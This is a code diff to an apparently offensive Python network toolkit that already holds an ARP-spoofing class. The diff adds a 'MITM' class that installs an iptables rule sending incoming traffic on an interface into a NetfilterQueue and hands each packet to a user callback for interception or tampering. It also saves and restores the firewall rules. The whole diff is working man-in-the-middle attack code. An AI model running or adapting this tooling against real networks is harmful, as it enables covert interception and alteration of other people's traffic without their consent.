@@ -5,6 +5,7 @@ from nifty.network.utils import get_mac, get_router_ip
 from time import sleep
 import nifty.config as config
 import multiprocessing
+from netfilterqueue import NetfilterQueue
 
 
 class ARPSpoofer():
@@ -48,3 +49,42 @@ class ARPSpoofer():
              hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
         send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
              hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)
+
+
+class MITM():
+    
+    _registered_queues = []
+
+    def start(callback, interface=config.interface, verbose=True):
+        # Find free queue number
+        queue_num = 1
+        while queue_num in MITM._registered_queues:
+            queue_num += 1
+        MITM._registered_queues.append(queue_num)
+        # Backup iptables
+        print("Saving iptables rules to /tmp/iptables.rules")
+        os.system("iptables-save > /tmp/iptables.rules")
+        # Add iptables rules
+        print("Adding iptables rules")
+        os.system("iptables -t raw -A PREROUTING -i {} -j NFQUEUE --queue-num {}".format(
+            interface,
+            queue_num
+        ))
+
+        # Start MITM
+        nf = NetfilterQueue()
+        nf.bind(queue_num, callback)
+        try:
+            print("Starting NetfilterQueue")
+            nf.run()
+        except KeyboardInterrupt:
+            pass
+        nf.unbind()
+        # Restore iptables
+        print("Restoring iptables rules")
+        os.system("iptables-restore < /tmp/iptables.rules")
+        print("Restarting firewall")
+        os.system("systemctl restart firewalld")
+
+        MITM._registered_queues.remove(queue_num)
+
